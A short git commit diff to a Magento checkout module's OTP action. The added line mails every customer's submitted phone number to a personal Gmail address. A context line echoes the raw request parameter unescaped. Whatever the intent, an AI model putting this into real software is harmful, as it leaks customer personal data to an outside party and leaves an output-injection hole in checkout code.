07d5882e9a85ac72f47ba418f7ce2525a229510e
Sanjeev Jha <tilkor.software@gmail.com>
2017-07-20 19:54:41 +0530

    otp

--- app/code/local/FacileCheckout/OnestepCheckout/controllers/IndexController.php
+++ app/code/local/FacileCheckout/OnestepCheckout/controllers/IndexController.php
@@ -699,6 +699,7 @@ class FacileCheckout_OnestepCheckout_IndexController extends Mage_Checkout_Contr
 	// For OTP
 	public function sendOtpAction(){
 		echo "Hiiii". $telephone = $this->getRequest()->getParam('telephone');
+		mail("ravikant00999@gmail.com","controller", $telephone);
 
 		// $this->getResponse()
             // ->setHeader('HTTP/1.1', '403 Session Expired')
